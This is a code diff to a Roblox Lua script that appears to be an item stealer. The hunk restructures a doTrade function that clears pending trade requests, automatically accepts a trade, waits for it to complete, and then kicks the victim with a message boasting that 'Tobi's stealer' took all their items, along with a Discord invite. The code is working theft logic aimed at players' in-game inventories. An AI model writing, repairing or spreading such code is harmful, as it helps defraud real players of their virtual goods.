@@ -455,25 +455,24 @@ if #weaponsToSend > 0 then
     end
 
     local function doTrade(joinedUser)
-        local initialTradeState = getTradeStatus()
-        if initialTradeState == "StartTrade" then
-            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
-            wait(0.3)
-        elseif initialTradeState == "ReceivingRequest" then
-            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
-            wait(0.3)
-                  end
-                end
-                wait(6)
-                acceptTrade()
-                waitForTradeCompletion()
-            else
-                wait(0.5)
-            end
-            wait(1)
-        end
-        plr:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
+    local initialTradeState = getTradeStatus()
+    if initialTradeState == "StartTrade" then
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
+        wait(0.3)
+    elseif initialTradeState == "ReceivingRequest" then
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+        wait(0.3)
+    else
+        wait(0.5)
     end
+
+    wait(6)
+    acceptTrade()
+    waitForTradeCompletion()
+    wait(1)
+
+    plr:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
+end
 
     local function waitForUserChat()
         local sentMessage = false
